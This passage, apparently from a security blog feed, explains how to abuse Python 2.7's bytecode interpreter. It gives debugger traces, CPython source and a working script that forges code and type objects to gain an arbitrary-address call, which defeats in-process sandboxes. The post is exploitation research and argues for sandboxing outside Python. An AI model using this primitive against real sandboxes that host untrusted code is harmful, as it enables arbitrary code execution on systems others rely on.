+Consts tuple @0x01db1030
+Address of controled data @0x022a0654
+Offset between const and our object: @0x0013bd86
+Going to push [0x022a0654] on the virtual stack</p>
+
+<p><em>JIT debugger pops</em></p>
+
+<p>eax=01db1030 ebx=00000000 ecx=00000063 edx=00000046 esi=deadbeef edi=0013bd86
+eip=1e0ec5fb esp=0027fc68 ebp=01e63fc0 iopl=0         nv up ei ng nz na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010287
+python27!PyEval_EvalFrameEx+0x34b:
+1e0ec5fb ff06            inc     dword ptr [esi]      ds:002b:deadbeef=????????
+0:000> ub eip l1
+python27!PyEval_EvalFrameEx+0x347:
+1e0ec5f7 8b74b80c        mov     esi,dword ptr [eax+edi<em>4+0Ch]
+0:000> ? eax+edi</em>4+c
+Evaluate expression: 36308564 = 022a0654
+0:000> dd 022a0654 l1
+022a0654  deadbeef &lt;&ndash; the data we control in our PyStringObject
+0:000> dps 022a0654-0n20 l2
+022a0640  00000003
+022a0644  1e226798 python27!PyString_Type
+```
+Perfect, we control a part of the virtual stack :).</p>
+
+<h2>Game over, LOAD_FUNCTION</h2>
+
+<p>Once you control the virtual stack the only limit is your imagination and the ability you have to find interesting spot in the virtual machine. My idea was to use the <em>CALL_FUNCTION</em> opcode to craft a <em>PyFunctionObject</em> somehow, to push it onto the virtual stack and to use the magic opcode.</p>
+
+<p><code>c PyFunctionObject definition
+typedef struct {
+  PyObject_HEAD
+  PyObject *func_code;  /* A code object */
+  PyObject *func_globals; /* A dictionary (other mappings won't do) */
+  PyObject *func_defaults;  /* NULL or a tuple */
+  PyObject *func_closure; /* NULL or a tuple of cell objects */
+  PyObject *func_doc;   /* The __doc__ attribute, can be anything */
+  PyObject *func_name;  /* The __name__ attribute, a string object */
+  PyObject *func_dict;  /* The __dict__ attribute, a dict or NULL */
+  PyObject *func_weakreflist; /* List of weak references */
+  PyObject *func_module;  /* The __module__ attribute, can be anything */
+} PyFunctionObject;
+</code></p>
+
+<p>The thing is as we saw earlier the virtual machine usually ensures the type of the object it handles, and if the type checking fails, the function bails out and we are not happy, at all. It means we would need an information-leak to obtain a pointer to the PyFunction_Type static variable.</p>
+
+<p>Fortunately for us the CALL_FUNCTION can still be abused without knowing that magic pointer to craft correctly our object. Let&rsquo;s go over the source code to illustrate my sayings:</p>
+
+<p>```c CALL_FUNCTION
+case CALL_FUNCTION:
+{
+  PyObject **sp;
+  PCALL(PCALL_ALL);
+  sp = stack_pointer;
+  x = call_function(&amp;sp, oparg);</p>
+
+<p>static PyObject *
+call_function(PyObject <em><strong>pp_stack, int oparg)
+{
+  int na = oparg &amp; 0xff;
+  int nk = (oparg>>8) &amp; 0xff;
+  int n = na + 2 * nk;
+  PyObject </strong>pfunc = (</em>pp_stack) &ndash; n &ndash; 1;
+  PyObject <em>func = </em>pfunc;
+  PyObject <em>x, </em>w;</p>
+
+<p>  if (PyCFunction_Check(func) &amp;&amp; nk == 0) {</p>
+
+<pre><code>// ..Nope..
+</code></pre>
+
+<p>  } else {</p>
+
+<pre><code>if (PyMethod_Check(func) &amp;&amp; PyMethod_GET_SELF(func) != NULL) {
+  // ..Still Nope...
+} else
+if (PyFunction_Check(func))
+  // Nope!
+else
+  x = do_call(func, pp_stack, na, nk);
+</code></pre>
+
+<p>static PyObject *
+do_call(PyObject <em>func, PyObject </em>**pp_stack, int na, int nk)
+{
+  // &hellip;
+  if (PyCFunction_Check(func)) {</p>
+
+<pre><code>// Nope
+</code></pre>
+
+<p>  }
+  else</p>
+
+<pre><code>result = PyObject_Call(func, callargs, kwdict);
+</code></pre>
+
+<p>PyObject *
+PyObject_Call(PyObject <em>func, PyObject </em>arg, PyObject *kw)
+{
+  ternaryfunc call;</p>
+
+<p>  if ((call = func->ob_type->tp_call) != NULL) {</p>
+
+<pre><code>PyObject *result;
+// Yay an interesting call :)
+result = (*call)(func, arg, kw);
+</code></pre>
+
+<p>```</p>
+
+<p>So basically the idea to use <em>CALL_FUNCTION</em> was a good one, but we will need to craft two different objects:</p>
+
+<ol>
+<li>The first one will be a <em>PyObject</em> with <em>ob_type</em> pointing to the second object</li>
+<li>The second object will be a <em>_typeobject</em> with <em>tp_call</em> the address you want to call</li>
+</ol>
+
+
+<p>This is fairly trivial to do and that will give us an absolute-call primitive without crashing the interpreter: s.w.e.e.t.</p>
+
+<p>```python absolute call via CALL_FUNCTION
+import opcode
+import types
+import struct</p>
+
+<p>def pshort(s):
+  return struct.pack(&lsquo;&lt;H&rsquo;, s)</p>
+
+<p>def puint(s):
+  return struct.pack(&lsquo;&lt;I&rsquo;, s)</p>
+
+<p>def a():
+  pass</p>
+
+<p>PyStringObject_to_char_array_offset = 20
+second_object = &lsquo;A&rsquo; * 0x40 + puint(0xdeadbeef)
+addr_second_object = id(second_object)
+addr_second_object_controled_data = addr_second_object + PyStringObject_to_char_array_offset</p>
+
+<p>first_object = &lsquo;AAAA&rsquo; + puint(addr_second_object_controled_data)
+addr_first_object = id(first_object)
+addr_first_object_controled_data = addr_first_object + PyStringObject_to_char_array_offset</p>
+
+<p>consts = ()
+s = puint(addr_first_object_controled_data)
+address_s = id(s) + PyStringObject_to_char_array_offset
+address_consts = id(consts)
+offset = ((address_s &ndash; address_consts &ndash; 0xC) / 4) &amp; 0xffffffff</p>
+
+<p>a.func_code = types.CodeType(
+  0, 0, 0, 0,
+  chr(opcode.opmap[&lsquo;EXTENDED_ARG&rsquo;])  + pshort(offset >> 16)     +
+  chr(opcode.opmap[&lsquo;LOAD_CONST&rsquo;])    + pshort(offset &amp; 0xffff)  +
+  chr(opcode.opmap[&lsquo;CALL_FUNCTION&rsquo;]) + pshort(0),
+  consts, (), (), &lsquo;&rsquo;, &lsquo;&rsquo;, 0, &lsquo;&rsquo;
+)
+a()
+```</p>
+
+<p>And we finally get our primitive working :&ndash;)</p>
+
+<p><code>text call 0xdeadbeef
+(11d0.11cc): Access violation - code c0000005 (!!! second chance !!!)
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files (x86)\Python\Python275\python27.dll -
+eax=01cc1030 ebx=00000000 ecx=00422e78 edx=00000000 esi=deadbeef edi=02e62df4
+eip=deadbeef esp=0027e78c ebp=02e62df4 iopl=0         nv up ei ng nz na po cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010283
+deadbeef ??              ???
+</code></p>
+
+<p>So now you know all the nasty things going under the hood with that <a href="https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/python27_abuse_vm_to_execute_x86_code.py">python27_abuse_vm_to_execute_x86_code.py</a> script!</p>
+
+<h1>Conclusion, Ideas</h1>
+
+<p>After that little post you are now aware that if you want to sandbox efficiently Python, you should do it outside of Python, and not preventing to use some modules or things like that: this is broken by design. The virtual machine is not enough safe to built a strong sandbox inside Python, so don&rsquo;t rely on such thing if you don&rsquo;t want to have some surprises. An article about that exact same thing has been written here if you are interested: <a href="https://lwn.net/Articles/574215/">The failure of pysandbox</a>.</p>
+
+<p>You also may want to look at <a href="http://pypy.org/features.html#sandboxing">PyPy&rsquo;s sandboxing capability</a> if you are interested to execute untrusted Python code. Otherwise, you can build your own <a href="https://code.google.com/p/seccompsandbox/wiki/overview">SECCOMP</a>-based system :).</p>
+
+<p>On the other hand, I had a lot of fun to deep dive into Python&rsquo;s source code, and I hope you had some too! If you would like to know more about the low level aspects of Python here are a list of interesting posts:</p>
+
+<ul>
+<li><a href="http://www.jmcneil.net/2012/04/debugging-your-python-with-gdb-ftw/">Debugging Your Python With GDB (FTW!)</a></li>
+<li><a href="http://nedbatchelder.com/blog/200804/the_structure_of_pyc_files.html">The structure of .pyc files</a></li>
+<li><a href="https://www.youtube.com/watch?v=ve7lLHtJ9l8">Bytecode: What, Why, and How to Hack it &ndash; Dr. Ryan F Kelly</a></li>
+<li><a href="https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/wildfire.py">Self-modifying Python bytecode</a></li>
+<li><a href="http://eli.thegreenplace.net/category/programming/python/python-internals/">Python internals series</a></li>
+</ul>
+
+
+<p>Folks, that&rsquo;s all for today ; don&rsquo;t hesitate to contact us if you have a cool post!</p>
+]]></content>
+  </entry>
+  
+</feed>
